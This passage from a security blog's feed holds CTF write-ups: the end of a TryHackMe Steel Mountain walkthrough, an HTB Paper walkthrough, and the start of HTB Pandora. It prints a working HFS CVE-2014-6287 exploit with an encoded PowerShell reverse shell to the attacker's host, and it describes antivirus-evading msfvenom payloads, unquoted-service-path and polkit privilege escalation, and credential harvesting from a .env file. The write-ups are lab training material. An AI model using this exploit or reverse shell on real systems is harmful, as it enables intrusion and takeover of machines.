<span class="o">|</span><span class="n">_clock</span><span class="o">-</span><span class="n">skew</span><span class="p">:</span> <span class="n">mean</span><span class="p">:</span> <span class="mi">1</span><span class="n">s</span><span class="p">,</span> <span class="n">deviation</span><span class="p">:</span> <span class="mi">0</span><span class="n">s</span><span class="p">,</span> <span class="n">median</span><span class="p">:</span> <span class="mi">0</span><span class="n">s</span>
<span class="o">|</span> <span class="n">smb</span><span class="o">-</span><span class="n">security</span><span class="o">-</span><span class="n">mode</span><span class="p">:</span> 
<span class="o">|</span>   <span class="n">authentication_level</span><span class="p">:</span> <span class="n">user</span>
<span class="o">|</span>   <span class="n">challenge_response</span><span class="p">:</span> <span class="n">supported</span>
<span class="o">|</span><span class="n">_</span>  <span class="n">message_signing</span><span class="p">:</span> <span class="n">disabled</span> <span class="p">(</span><span class="n">dangerous</span><span class="p">,</span> <span class="n">but</span> <span class="n">default</span><span class="p">)</span>
<span class="o">|</span> <span class="n">smb2</span><span class="o">-</span><span class="n">security</span><span class="o">-</span><span class="n">mode</span><span class="p">:</span> 
<span class="o">|</span>   <span class="mf">3.0</span><span class="p">.</span><span class="mi">2</span><span class="p">:</span> 
<span class="o">|</span><span class="n">_</span>    <span class="n">Message</span> <span class="n">signing</span> <span class="n">enabled</span> <span class="n">but</span> <span class="ow">not</span> <span class="n">required</span>
<span class="o">|</span><span class="n">_nbstat</span><span class="p">:</span> <span class="n">NetBIOS</span> <span class="n">name</span><span class="p">:</span> <span class="n">STEELMOUNTAIN</span><span class="p">,</span> <span class="n">NetBIOS</span> <span class="n">user</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">unknown</span><span class="o">&gt;</span><span class="p">,</span> <span class="n">NetBIOS</span> <span class="n">MAC</span><span class="p">:</span> <span class="mi">02</span><span class="p">:</span><span class="n">f7</span><span class="p">:</span><span class="mi">82</span><span class="p">:</span><span class="n">dc</span><span class="p">:</span><span class="mi">95</span><span class="p">:</span><span class="mi">51</span> <span class="p">(</span><span class="n">unknown</span><span class="p">)</span>
<span class="o">|</span> <span class="n">smb2</span><span class="o">-</span><span class="n">time</span><span class="p">:</span> 
<span class="o">|</span>   <span class="n">date</span><span class="p">:</span> <span class="mi">2022</span><span class="o">-</span><span class="mi">05</span><span class="o">-</span><span class="mi">27</span><span class="n">T21</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="mi">51</span>
<span class="o">|</span><span class="n">_</span>  <span class="n">start_date</span><span class="p">:</span> <span class="mi">2022</span><span class="o">-</span><span class="mi">05</span><span class="o">-</span><span class="mi">27</span><span class="n">T20</span><span class="p">:</span><span class="mi">58</span><span class="p">:</span><span class="mi">34</span>

<span class="n">Service</span> <span class="n">detection</span> <span class="n">performed</span><span class="p">.</span> <span class="n">Please</span> <span class="n">report</span> <span class="nb">any</span> <span class="n">incorrect</span> <span class="n">results</span> <span class="n">at</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="p">.</span><span class="n">org</span><span class="o">/</span><span class="n">submit</span><span class="o">/</span> <span class="p">.</span>
<span class="c1"># Nmap done at Fri May 27 17:12:55 2022 -- 1 IP address (1 host up) scanned in 89.18 seconds
</span></code></pre></div></div>

<p>We can use <strong><em>crackmapexec</em></strong> using the smb protocol to know what version of windows is using, this can be useful when we need to search for certain exploit or vulnerablity with a specific version of windows.</p>

<p align="center">
<img src="/assets/images/img-steelMountain/captura4.png" />
</p>

<p>So one of the first challenges in this machine it’s to indentify the person on the image that is shown on the webpage.</p>

<p align="center">
<img src="/assets/images/img-steelMountain/captura5.png" />
</p>

<p>We can download the image and use some osint tools to recognize the image, but in this case it’s not necessary we just need to see the source code of the website and we can find the name.</p>

<p align="center">
<img src="/assets/images/img-steelMountain/captura6.png" />
</p>

<p>In the fuzzing process we can’t find anything interesting.</p>

<p align="center">
<img src="/assets/images/img-steelMountain/captura8.png" />
</p>

<p>So on the nmap scan we see that there is a port 8080 open and if we access it’s a user panel of HFS (HTTP file server) which is used to sharing files on http. On the bottom we can see the version of this service.</p>

<p align="center">
<img src="/assets/images/img-steelMountain/captura9.png" />
</p>

<p>In this case we don’t have any valid credentials to access it, and if we try with some default credentials it will not work.</p>

<p align="center">
<img src="/assets/images/img-steelMountain/captura10.png" />
</p>

<p>With <strong><em>searchspliot</em></strong> we can see that there is some exploits of this service, in this case we are interesting on the first one which is the same version that we saw on the target machine. So let’s copy it using the <strong><em>-m</em></strong> flag.</p>

<p align="center">
<img src="/assets/images/img-steelMountain/captura11.png" />
</p>

<p>If we look at the exploit it’s tell us the cve which in this case is <strong><em>CVE-2014-6287</em></strong>, basically this vulnerablity allows attackers to execute code remontly (RCE) via a <strong><em>%00</em></strong> sequence in a search action (we can see this on the line 36 in the code which is the variable “url”). We can exploit this manually but in this case we are going to use the follwing exploit because automates all the process to encode and decode the reverse shell, in this case we need to change the data on the following variables with our ip address (lhost) and the port (lport) and same thing with the target system.</p>

<p>The other thing that i modify in this exploit it’s to comment the last two lines, because i want just listing with netcat in another window and get proper reverse shell.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Exploit Title: HFS (HTTP File Server) 2.3.x - Remote Command Execution (3)
# Google Dork: intext:"httpfileserver 2.3"
# Date: 20/02/2021
# Exploit Author: Pergyz
# Vendor Homepage: http://www.rejetto.com/hfs/
# Software Link: https://sourceforge.net/projects/hfs/
# Version: 2.3.x
# Tested on: Microsoft Windows Server 2012 R2 Standard
# CVE : CVE-2014-6287
# Reference: https://www.rejetto.com/wiki/index.php/HFS:_scripting_commands
</span>
<span class="c1">#!/usr/bin/python3
</span>
<span class="kn">import</span> <span class="nn">base64</span>
<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">urllib.request</span>
<span class="kn">import</span> <span class="nn">urllib.parse</span>

<span class="n">lhost</span> <span class="o">=</span> <span class="s">"10.18.119.243"</span>
<span class="n">lport</span> <span class="o">=</span> <span class="mi">4242</span>
<span class="n">rhost</span> <span class="o">=</span> <span class="s">"10.10.97.160"</span>
<span class="n">rport</span> <span class="o">=</span> <span class="mi">8080</span>

<span class="c1"># Define the command to be written to a file
</span><span class="n">command</span> <span class="o">=</span> <span class="sa">f</span><span class="s">'$client = New-Object System.Net.Sockets.TCPClient("</span><span class="si">{</span><span class="n">lhost</span><span class="si">}</span><span class="s">",</span><span class="si">{</span><span class="n">lport</span><span class="si">}</span><span class="s">); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{{0}}; while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){{; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i); $sendback = (Invoke-Expression $data 2&gt;&amp;1 | Out-String ); $sendback2 = $sendback + "PS " + (Get-Location).Path + "&gt; "; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}}; $client.Close()'</span>

<span class="c1"># Encode the command in base64 format
</span><span class="n">encoded_command</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">command</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="s">"utf-16le"</span><span class="p">)).</span><span class="n">decode</span><span class="p">()</span>
<span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">Encoded the command in base64 format..."</span><span class="p">)</span>

<span class="c1"># Define the payload to be included in the URL
</span><span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s">'exec|powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -EncodedCommand </span><span class="si">{</span><span class="n">encoded_command</span><span class="si">}</span><span class="s">'</span>

<span class="c1"># Encode the payload and send a HTTP GET request
</span><span class="n">encoded_payload</span> <span class="o">=</span> <span class="n">urllib</span><span class="p">.</span><span class="n">parse</span><span class="p">.</span><span class="n">quote_plus</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">url</span> <span class="o">=</span> <span class="sa">f</span><span class="s">'http://</span><span class="si">{</span><span class="n">rhost</span><span class="si">}</span><span class="s">:</span><span class="si">{</span><span class="n">rport</span><span class="si">}</span><span class="s">/?search=%00{{.</span><span class="si">{</span><span class="n">encoded_payload</span><span class="si">}</span><span class="s">.}}'</span>
<span class="n">urllib</span><span class="p">.</span><span class="n">request</span><span class="p">.</span><span class="n">urlopen</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">Encoded the payload and sent a HTTP GET request to the target..."</span><span class="p">)</span>

<span class="c1"># Print some information
</span><span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">Printing some information for debugging..."</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="s">"lhost: "</span><span class="p">,</span> <span class="n">lhost</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="s">"lport: "</span><span class="p">,</span> <span class="n">lport</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="s">"rhost: "</span><span class="p">,</span> <span class="n">rhost</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="s">"rport: "</span><span class="p">,</span> <span class="n">rport</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="s">"payload: "</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>

<span class="c1"># Listen for connections
#print("\nListening for connection...")
#os.system(f'nc -nlvp {lport}')
</span>
</code></pre></div></div>

<p>Now we need just to execute the exploit and wait for a connection, as we can see i have receive a connection and have access to the target machine.</p>

<p align="center">
<img src="/assets/images/img-steelMountain/captura13.png" />
</p>

<p>If we list the users on the system we have user call <strong><em>bill</em></strong>.</p>

<p align="center">
<img src="/assets/images/img-steelMountain/captura14.png" />
</p>

<p>Now if we move on the desktop folder of this user we can view the first flag.</p>

<p align="center">
<img src="/assets/images/img-steelMountain/captura15.png" />
</p>

<p>In this we can’t find any privileges with this user that we can take advantage.</p>

<p align="center">
<img src="/assets/images/img-steelMountain/captura16.png" />
</p>

<p>If we execute the command <strong><em>systeminfo</em></strong> it will tell us more information about the system, we can see that is <strong><em>x64-based</em></strong> this can be useful if we need to download any executable or with certain exploits.</p>

<p align="center">
<img src="/assets/images/img-steelMountain/captura17.png" />
</p>

<p>We are going to download <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1">powerup</a> and transfer it to the target machine with <strong><em>certutil.exe</em></strong>. Basically this tools can help us to find common windows privEsc vectors that are misconfigured.</p>

<p align="center">
<img src="/assets/images/img-steelMountain/captura18.png" />
</p>

<p>Once we transfer the file we need to import it using the <strong><em>Import-Module</em></strong> cmdlet and execuit it. We are going to use the <strong><em>Invoke-Allcheck</em></strong> command to check all the services on the system and their vulnerablities. So here we can see that there is a service that says <strong><em>Unquoted paths service</em></strong>.</p>

<p>Basically when a service is created if his executable path contains spaces and isn’t enclosed within quotes leads to a vulnerability known as <strong><em>Unquoted Service Path</em></strong> which allows attackers to gain system privileges and be user admins (only if the service is running with higher privileges, which is very common).</p>

<p align="center">
<img src="/assets/images/img-steelMountain/captura19.png" />
</p>

<p>We can see this more clearly using <a href="https://github.com/carlospolop/PEASS-ng/releases/tag/20220731">winpeas</a>, as we can see winpeas reports us that this services has no quotes and have speces and we have write permissions.</p>

<p align="center">
<img src="/assets/images/img-steelMountain/captura20.png" />
</p>

<p>In order to exploit this vulnerablity we need to know how it works, so basically when you start or stop services on windows this will check for the actual path for the service executable in our case the executable is <strong><em>ASCService.exe</em></strong> and this executable is responsible for starting up everyting that is requiered for <strong><em>Advanced systemcate</em></strong>, and if this are not encapsulated in quote marks we can modify this path or in this case modify the executable with our own malicious executable that then execute it can provide a privileged reverse shell.</p>

<p>The behavoir that windows will follow is to think that the spaces defined different argument, in this case let’s say .exe:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Program.exe
C:\Program Files.exe
C:\Program Files (x86)\IObit\Advanced.exe
C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
</code></pre></div></div>
<p>And if we have write permissions in one of this directories we can put our malicious binary and exploit this vulnerability. In order to do that we need two requirements which is the ability to start and stop the service to execute the binary (canRestart: True) and then wirte permissions on that service path to modify the executable (Winpeas).More info <a href="https://medium.com/@SumitVerma101/windows-privilege-escalation-part-1-unquoted-service-path-c7a011a8d8ae">here</a>.</p>

<p>Another way to check if we have write permissions in one of those directories is to use a command called <strong><em>icacls</em></strong>, and as you can see we as a bill user we have write permissions that is indicated with the letter <strong><em>W</em></strong>.</p>

<p align="center">
<img src="/assets/images/img-steelMountain/captura21.png" />
</p>

<p>Now we are going to create our malicious binary with msfvenom called <strong><em>Advanced.exe</em></strong> remember that the path “Advanced SysteCare” have spaces. And we are going to use the encoder <strong><em>Shikata_ga_nai</em></strong> for bypass some antivirus (this in real life can’t be very effective, but we can try to use it).</p>

<p align="center">
<img src="/assets/images/img-steelMountain/captura22.png" />
</p>

<p>Now tranfer this binary on the target machine, in this case i am doing with certutl.exe.</p>

<p align="center">
<img src="/assets/images/img-steelMountain/captura23.png" />
</p>

<p>Now we need to move that binary on the directory that the <strong><em>Advanced Systemcare</em></strong> is, because this is where the vulnerability come from.</p>

<p align="center">
<img src="/assets/images/img-steelMountain/captura24.png" />
</p>

<p>Now we are going to listen with netcat on the other window and on the target machine we are going to stop that vulnerable service using the command <strong><em>Stop-Service</em></strong>, and finally if we start the service using the command <strong><em>Start-Service</em></strong> we receive connection form the target machine and we have Admin privileges. Remember that you can do the same thing changing the service binary <strong><em>ASCService.exe</em></strong>.</p>

<p align="center">
<img src="/assets/images/img-steelMountain/captura25.png" />
</p>

<p>And now we can move on the admin user desktop folder and visualize the last flag, and we pwned the machine.</p>

<p align="center">
<img src="/assets/images/img-steelMountain/captura26.png" />
</p>]]></content><author><name>bynafrez</name></author><category term="CTF" /><category term="Tryhackme" /><category term="Windows" /><category term="Powershell" /><category term="CVE" /><summary type="html"><![CDATA[Steelmountain is windows machine inspired by the mr.robot serie, first we have a little osint challenge we need to indentify the person on the image on the website then we exploit the CVE-2014-6287 to gain access to the target machine and...]]></summary></entry><entry><title type="html">HTB - Paper</title><link href="http://0.0.0.0:4000/htb-paper/" rel="alternate" type="text/html" title="HTB - Paper" /><published>2022-06-17T00:00:00-04:00</published><updated>2022-06-17T00:00:00-04:00</updated><id>http://0.0.0.0:4000/htb-paper</id><content type="html" xml:base="http://0.0.0.0:4000/htb-paper/"><![CDATA[<p>Paper is linux machine with easy level of difficulty on the exploitation phase to access to the machine and a medium level of difficulty on the privESC, this machine have running a wordpress on the port 80 and in this case the version of wordpress it’s vulnerable to view private content on a blog post which this gives us a subdomain that redirects us to a chating service called <strong><em>rocket.chat</em></strong> that will contains a bot which allow us to list directories and to see the content to a specific file that contains the password to access via ssh to the machine, and the privESC is vulnerable to <strong><em>CVE-2021-3560</em></strong>.</p>

<p align="center">
<img src="/assets/images/img-paper/portada.png" />
</p>

<p>Machine matrix:</p>

<p align="center">
<img src="/assets/images/img-paper/matrix.png" />
</p>

<p>First we are going to create a directory to the name of the machine and inside with <strong><em>mkt</em></strong> we are going to create the following directories.</p>

<p align="center">
<img src="/assets/images/img-paper/captura1.png" />
</p>

<p><strong><em>mkt</em></strong> is a function that i have defined in the <strong><em>~/.zshrc</em></strong> so that I can create these directories without creating them one by one.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mkt () {
        mkdir {nmap,content,exploits,scripts}
}
</code></pre></div></div>

<p>And if we send one icmp trace on the target machine we receive a connection, and remember that the linux machine have 64 TTL and windows have 128 TTL and sometimes this values can decrease one digit and this because of traceroute.</p>

<p align="center">
<img src="/assets/images/img-paper/captura2.png" />
</p>

<p>Anyway, in my machine y have defined a script called <strong><em>wichSystem</em></strong> with just specifying the target ip address it will tell us through the ttl if it’s a windows or linux machine.</p>

<p align="center">
<img src="/assets/images/img-paper/captura3.png" />
</p>

<p>Wichsystem script.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
#coding: utf-8
</span> 
<span class="kn">import</span> <span class="nn">re</span><span class="p">,</span> <span class="n">sys</span><span class="p">,</span> <span class="n">subprocess</span>
 
<span class="c1"># python3 wichSystem.py YOURIP 
</span> 
<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">[!] Uso: python3 "</span> <span class="o">+</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s">" &lt;direccion-ip&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
    <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
 
<span class="k">def</span> <span class="nf">get_ttl</span><span class="p">(</span><span class="n">ip_address</span><span class="p">):</span>
 
    <span class="n">proc</span> <span class="o">=</span> <span class="n">subprocess</span><span class="p">.</span><span class="n">Popen</span><span class="p">([</span><span class="s">"/usr/bin/ping -c 1 %s"</span> <span class="o">%</span> <span class="n">ip_address</span><span class="p">,</span> <span class="s">""</span><span class="p">],</span> <span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">PIPE</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
    <span class="p">(</span><span class="n">out</span><span class="p">,</span><span class="n">err</span><span class="p">)</span> <span class="o">=</span> <span class="n">proc</span><span class="p">.</span><span class="n">communicate</span><span class="p">()</span>
 
    <span class="n">out</span> <span class="o">=</span> <span class="n">out</span><span class="p">.</span><span class="n">split</span><span class="p">()</span>
    <span class="n">out</span> <span class="o">=</span> <span class="n">out</span><span class="p">[</span><span class="mi">12</span><span class="p">].</span><span class="n">decode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">)</span>
 
    <span class="n">ttl_value</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="n">findall</span><span class="p">(</span><span class="sa">r</span><span class="s">"\d{1,3}"</span><span class="p">,</span> <span class="n">out</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
 
    <span class="k">return</span> <span class="n">ttl_value</span>
 
<span class="k">def</span> <span class="nf">get_os</span><span class="p">(</span><span class="n">ttl</span><span class="p">):</span>
 
    <span class="n">ttl</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">ttl</span><span class="p">)</span>
 
    <span class="k">if</span> <span class="n">ttl</span> <span class="o">&gt;=</span> <span class="mi">0</span> <span class="ow">and</span> <span class="n">ttl</span> <span class="o">&lt;=</span> <span class="mi">64</span><span class="p">:</span>
        <span class="k">return</span> <span class="s">"Linux"</span>
    <span class="k">elif</span> <span class="n">ttl</span> <span class="o">&gt;=</span> <span class="mi">65</span> <span class="ow">and</span> <span class="n">ttl</span> <span class="o">&lt;=</span> <span class="mi">128</span><span class="p">:</span>
        <span class="k">return</span> <span class="s">"Windows"</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="s">"Not Found"</span>
 
<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
 
    <span class="n">ip_address</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
 
    <span class="n">ttl</span> <span class="o">=</span> <span class="n">get_ttl</span><span class="p">(</span><span class="n">ip_address</span><span class="p">)</span>
 
    <span class="n">os_name</span> <span class="o">=</span> <span class="n">get_os</span><span class="p">(</span><span class="n">ttl</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">%s (ttl -&gt; %s): %s</span><span class="se">\n</span><span class="s">"</span> <span class="o">%</span> <span class="p">(</span><span class="n">ip_address</span><span class="p">,</span> <span class="n">ttl</span><span class="p">,</span> <span class="n">os_name</span><span class="p">))</span>

</code></pre></div></div>

<h2 id="scanning">Scanning</h2>

<p>Now we are going to proceed to scanning the target machine to know what available ports haves and the service that it’s running, so we are going to perform a nmap scan with the following flags.</p>

<table>
  <thead>
    <tr>
      <th>Flags</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>-sC</td>
      <td>Use nmap default scripts.</td>
    </tr>
    <tr>
      <td>-sV</td>
      <td>Probe open ports to determine service/version info.</td>
    </tr>
    <tr>
      <td>-oA</td>
      <td>Output the scan in the three major formats at once in a file.</td>
    </tr>
  </tbody>
</table>

<p>The scan:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Nmap 7.92 scan initiated Wed Jun 15 20:08:37 2022 as: nmap -sC -sV -oA allports 10.10.11.143
Nmap scan report for 10.10.11.143
Host is up (0.10s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey:
|   2048 10:05:ea:50:56:a6:00:cb:1c:9c:93:df:5f:83:e0:64 (RSA)
|   256 58:8c:82:1c:c6:63:2a:83:87:5c:2f:2b:4f:4d:c3:79 (ECDSA)
|_  256 31:78:af:d1:3b:c4:2e:9d:60:4e:eb:5d:03:ec:a0:22 (ED25519)
80/tcp  open  http     Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
|_http-title: HTTP Server Test Page powered by CentOS
|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
443/tcp open  ssl/http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
|_http-title: HTTP Server Test Page powered by CentOS
| http-methods:
|_  Potentially risky methods: TRACE
|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US
| Subject Alternative Name: DNS:localhost.localdomain
| Not valid before: 2021-07-03T08:52:34
|_Not valid after:  2022-07-08T10:32:34
| tls-alpn:
|_  http/1.1
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
|_ssl-date: TLS randomness does not represent time

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jun 15 20:09:11 2022 -- 1 IP address (1 host up) scanned in 33.57 seconds
</code></pre></div></div>

<p>So if we access on webpage on the port 80 it’s just the default apache page for centos.</p>

<p align="center">
<img src="/assets/images/img-paper/captura4.png" />
</p>

<p>So on the nmap scan it reports us that the webserver is using http TRACE method, so if we send a request to the webserver with curl or burpsuite on the http header <strong><em>x-backend-Server</em></strong> it’s redirects to the following domain.</p>

<p align="center">
<img src="/assets/images/img-paper/captura5.png" />
</p>

<p>So let’s add this domain on the hosts file.</p>

<p align="center">
<img src="/assets/images/img-paper/captura6.png" />
</p>

<p>And if we access with that domain we can see that is a wordpress blog page and the <strong><em>wappalyzer</em></strong> extension reports us the version that is using.</p>

<p align="center">
<img src="/assets/images/img-paper/captura7.png" />
</p>

<p>And here we can see some interesting post that the user <strong><em>Michael</em></strong> is leaking some secrets information.</p>

<p align="center">
<img src="/assets/images/img-paper/captura8.png" />
</p>

<p>So with searchsploit if we specify the wordpress version we can see that the version of the target we can view private contents in a posts. So let’s copy that exploit with the <strong><em>-m</em></strong> flag.</p>

<p align="center">
<img src="/assets/images/img-paper/captura9.png" />
</p>

<p>So basically, it’s tell us that we can view some secret contents specifying <strong><em>?static=1</em></strong> on the url using some parameters.</p>

<p align="center">
<img src="/assets/images/img-paper/captura10.png" />
</p>

<p>So my case it will works but puting the value two instead of one, and here we can see the secret post that mention the following subdomain.</p>

<p align="center">
<img src="/assets/images/img-paper/captura11.png" />
</p>

<p>Let’s put this subdomain on the hosts file.</p>

<p align="center">
<img src="/assets/images/img-paper/captura12.png" />
</p>

<p>And the url that is mention on that post it will redirect on this register form of <strong><em>rocket.chat</em></strong> which is a open source application that is used for chating in public or private networks in most cases. So in this case i registered with this test user.</p>

<p align="center">
<img src="/assets/images/img-paper/captura13.png" />
</p>

<p>So if we click on the search icon we can see that there is some users and a general chat.</p>

<p align="center">
<img src="/assets/images/img-paper/captura14.png" />
</p>

<p>And if we go in that general chat we can see that there is bot with some few bugs, hmm interesting.</p>

<p align="center">
<img src="/assets/images/img-paper/captura15.png" />
</p>

<p>So in this let’s check how this bot works, so for that click on the bot profile and then click on the message icon because we don’t have permission to write on the general chat.</p>

<p align="center">
<img src="/assets/images/img-paper/captura16.png" />
</p>

<h2 id="exploitation">Exploitation</h2>

<p>So if we send the command <strong><em>recyclops help</em></strong> it will show the same thing on the general chat and here we can see that we are able to list directories and see the content of some particular file using the following commands.</p>

<p align="center">
<img src="/assets/images/img-paper/captura17.png" />
</p>

<p>So in this case i try to list the sale directory and will list the content of that directory and it’s seems that is listing using the <strong><em>ls</em></strong> command, so this reminds me that is listing this directory on the system that is hosted this chat service.</p>

<p align="center">
<img src="/assets/images/img-paper/captura18.png" />
</p>

<p>So if we look the content of that file there is nothing interesting there.</p>

<p align="center">
<img src="/assets/images/img-paper/captura19.png" />
</p>

<p>So if we try to move two directories back we can list some other directories on the system and here we can see a <strong><em>.ssh</em></strong> directory.</p>

<p align="center">
<img src="/assets/images/img-paper/captura20.png" />
</p>

<p>But in this case on the directory .ssh there is no ssh keys that we can use to access on the target machine.</p>

<p align="center">
<img src="/assets/images/img-paper/captura21.png" />
</p>

<p>And if we try to look the content of the user.txt file we don’t have permissions.</p>

<p align="center">
<img src="/assets/images/img-paper/captura22.png" />
</p>

<p>So listing some directories i find this directory with some interesting files like <strong><em>.env</em></strong> which normally contain some system environment variables.</p>

<p align="center">
<img src="/assets/images/img-paper/captura23.png" />
</p>

<p>And if we try to list that file we can see some user credentials. So before we saw that there is the port 22 open so i try to access with this user but didn’t work.</p>

<p align="center">
<img src="/assets/images/img-paper/captura24.png" />
</p>

<p>But if we move few directories back to list the <strong><em>passwd</em></strong> we can see that there is a user called <strong><em>dwight</em></strong> as we saw before.</p>

<p align="center">
<img src="/assets/images/img-paper/captura25.png" />
</p>

<p>So i try to ssh with this user using the password that we find on the .env file, and as we can see it works and we have access to the machine and we can view the first flag. So in this case the exploitation phase it is very easy.</p>

<p align="center">
<img src="/assets/images/img-paper/captura26.png" />
</p>

<h2 id="privesc">PrivESC</h2>

<p>There is no SUID files or interesting bineries here, so nothing here.</p>

<p align="center">
<img src="/assets/images/img-paper/captura27.png" />
</p>

<p>Let’s to upload linpeas on the target machine to see if there some file or process that we can use to escalate privileges, let’s assign executable permission and execute it.</p>

<p align="center">
<img src="/assets/images/img-paper/captura28.png" />
</p>

<p>So linpeas reports us that this machine it’s vulnerable to the following cve.</p>

<p align="center">
<img src="/assets/images/img-paper/captura29.png" />
</p>

<p>Basically this vulnerability effects the polikt or policykit service on linux systems which this is used to unprivileged processes can communicate with privileged processes on the system, let’s say that you want to do something that requires higher privileges (like creating user,add permissions, etc) then here when polkits comes to decide whether or not we are allowed to do it. And this vulnerability bypasses credential checks for D-bus (which is an authentication agent) request, elevating the requester’s privileges to root. more info <a href="https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/">here</a></p>

<p>So if we google about this cve we can find some exploits that automates this process and become a root user. So in this case i am going to use the following <a href="https://github.com/Almorabea/Polkit-exploit/blob/main/CVE-2021-3560.py">exploit</a>.</p>

<p align="center">
<img src="/assets/images/img-paper/captura30.png" />
</p>

<p>So once we download the exploit let’s upload it on the target machine and then add executable permissions.</p>

<p align="center">
<img src="/assets/images/img-paper/captura31.png" />
</p>

<p>And now just executing this exploilt we become a root user and we can view the root flag.</p>

<p align="center">
<img src="/assets/images/img-paper/captura32.png" />
</p>

<p>And with that we pwned this machine.</p>

<p align="center">
<img src="/assets/images/img-paper/pwned.png" />
</p>]]></content><author><name>bynafrez</name></author><category term="CTF" /><category term="web pentesting" /><category term="Hack the box" /><category term="CVE" /><category term="CMS exploit" /><summary type="html"><![CDATA[Paper is linux machine with easy level of difficulty on the exploitation phase to access to the machine and a medium level of difficulty on the privESC, this machine have running a wordpress on the port 80 and in this case the version of wordpress...]]></summary></entry><entry><title type="html">HTB - Pandora</title><link href="http://0.0.0.0:4000/htb-pandora/" rel="alternate" type="text/html" title="HTB - Pandora" /><published>2022-05-22T00:00:00-04:00</published><updated>2022-05-22T00:00:00-04:00</updated><id>http://0.0.0.0:4000/htb-pandora</id><content type="html" xml:base="http://0.0.0.0:4000/htb-pandora/"><![CDATA[<p>Pandora is a linux machine with easy level of difficulty both in explotation phase and PrivESC, and this machine runs snmp service through UDP that we will use to enumerate the target machine and some processes that it’s running and also this machine runs pandora fms that is vulnerable sqli and RCE that will help us to gain access to the machine and with that we will escalate privileges with PATH hijacking.</p>

<p align="center">
<img src="/assets/images/img-pandora/portada.png" />
</p>

<p>Machine matrix:</p>

<p align="center">
<img src="/assets/images/img-pandora/matrix.png" />
</p>

<p>First we will create a directory with the name of the machine, and with <strong><em>mkt</em></strong> i will create the following directories to be able to move better the content of each one of those directories.</p>

<p align="center">
<img src="/assets/images/img-pandora/captura1.png" />
</p>

<p>mkt is a function that i have defined in the <strong><em>~/.zshrc</em></strong> so that I can create these directories without creating them one by one.</p>

